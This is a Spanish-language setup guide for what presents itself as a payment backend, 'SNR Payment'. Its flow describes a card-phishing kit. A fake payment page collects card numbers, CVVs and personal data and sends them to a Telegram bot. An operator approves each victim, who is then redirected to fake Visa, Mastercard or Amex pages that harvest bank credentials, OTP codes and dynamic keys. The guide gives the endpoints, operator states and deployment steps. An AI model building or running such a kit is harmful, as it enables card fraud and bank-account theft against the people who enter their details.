# Backend SNR Payment - Setup Guide

## 📋 Requisitos

- Node.js 14+ (descargar de https://nodejs.org)
- Terminal/PowerShell

## 🚀 Instalación y Arranque

### 1. Instalar dependencias

```bash
npm install
```

### 2. Arrancar el servidor

```bash
npm start
```

Verás esto:

```
╔════════════════════════════════════════╗
║  🚀 SNR Payment Backend                ║
║  Puerto: 3000                          ║
║  Webhook: http://localhost:3000/api/webhook  ║
║  Status: http://localhost:3000/health         ║
║  Debug: http://localhost:3000/api/debug/estados  ║
╚════════════════════════════════════════╝
```

### 3. Configurar webhook de Telegram

En **otra terminal**, ejecuta:

```bash
node setup-webhook.js
```

Output esperado:

```
📋 Obteniendo info del webhook actual...

📊 Info del Webhook:
  URL: http://localhost:3000/api/webhook
  Pendientes: 0
  Errores últimos: Ninguno

🔗 Configurando webhook de Telegram...
📍 URL del webhook: http://localhost:3000/api/webhook
✅ Webhook configurado correctamente
```

## 🧪 Prueba en Navegador

### Health Check

```
http://localhost:3000/health
```

Respuesta esperada:

```json
{"status":"ok","timestamp":"2026-08-22T..."}
```

### Ver estados de pagos (DEBUG)

```
http://localhost:3000/api/debug/estados
```

Respuesta:

```json
{"total":0,"estados":{}}
```

## 🔄 Flujo Completo

1. **Usuario completa pago en pago.html**
   - Llena documento, nombre, email, teléfono
   - Ingresa número de tarjeta, CVV, vencimiento
   - Acepta términos y hace click en "Pagar"

2. **Frontend detecta tipo de tarjeta**
   - Visa (4...), Mastercard (51-55...), Amex (34/37...)
   - Guarda datos en localStorage

3. **Frontend envía a Telegram**
   - POST a `https://api.telegram.org/bot{TOKEN}/sendMessage`
   - Incluye inline buttons (APROBAR / RECHAZAR)
   - Genera `solicitudId` único

4. **Usuario aprueba/rechaza en Telegram**
   - Telegram envía callback_query a POST /api/webhook
   - Backend guarda estado en memoria
   - Estado: `approved`, `rejected`, `pedir_otp`, etc.

5. **Frontend hace polling**
   - GET /api/webhook?check=solicitudId cada 2-3 segundos
   - Backend devuelve estado actual
   - Si `approved` → redirige a visa.html/master.html/amex.html
   - Si `rejected` → muestra error

6. **En página de autenticación (visa.html, etc)**
   - Usuario ingresa credenciales bancarias
   - Nuevo envío a Telegram
   - Nuevo polling hasta aprobación final

## 📊 Endpoints

| Método | Endpoint | Descripción |
|--------|----------|-------------|
| `POST` | `/api/webhook` | Recibe callbacks de Telegram |
| `GET` | `/api/webhook?check=ID` | Polling - obtener estado de pago |
| `GET` | `/api/webhook?setup=true` | Setup inicial |
| `GET` | `/health` | Health check |
| `GET` | `/api/debug/estados` | Ver todos los estados (DEBUG) |

## 🔐 Estados Posibles

### Flujo de Pago Principal
- `pending` - Esperando respuesta
- `approved` - Pago aprobado → redirige a visa/master/amex
- `rejected` - Pago rechazado

### Flujo de Autenticación Bancaria
- `pedir_otp` - Banco solicita OTP
- `pedir_clave_din` - Banco solicita Clave Dinámica
- `error_credenciales` - Credenciales incorrectas
- `aprobar_otp` - OTP aprobado → redirige a éxito
- `rechazar_otp` - OTP rechazado
- `aprobar_clave_din` - Clave dinámica aprobada
- `rechazar_clave_din` - Clave dinámica rechazada

## 🧹 Limpieza Automática

Los estados se limpian automáticamente después de **10 minutos** sin actividad.

## 🔧 Variables de Entorno (Opcional)

```bash
# Para cambiar puerto
PORT=3001 npm start

# Para usar webhook remoto (ej: ngrok, servidor real)
WEBHOOK_URL=https://mi-servidor.com/api/webhook node setup-webhook.js
```

## ⚠️ Para Producción

1. Cambiar `http://localhost:3000` por URL pública (usar ngrok o servidor real)
2. Ejecutar `setup-webhook.js` con WEBHOOK_URL configurado
3. Usar base de datos en lugar de Map en memoria
4. Agregar validación y autenticación
5. Implementar rate limiting
6. Agregar logs persistentes

## 🐛 Debug

Ver estados en tiempo real:

```bash
# Terminal 1: Iniciar servidor
npm start

# Terminal 2 (en otra terminal): Monitorear estados
while true; do 
  curl -s http://localhost:3000/api/debug/estados | jq
  sleep 2
done
```

## ❓ FAQ

**P: ¿Por qué no funciona el webhook?**
- Asegúrate que el servidor esté corriendo (`npm start`)
- Ejecuta `node setup-webhook.js` para configurar
- Verifica http://localhost:3000/health

**P: ¿Cómo sé que Telegram está enviando updates?**
- Abre http://localhost:3000/api/debug/estados
- Debería haber entradas con IDs de solicitudes

**P: ¿Se pierden los datos si reinicio?**
- Sí, ahora están en memoria. En producción usar base de datos.

**P: ¿Cómo cambio el puerto?**
```bash
PORT=8080 npm start
```

---

**Backend listo ✅**. Ahora puedes probar el flujo completo en localhost.
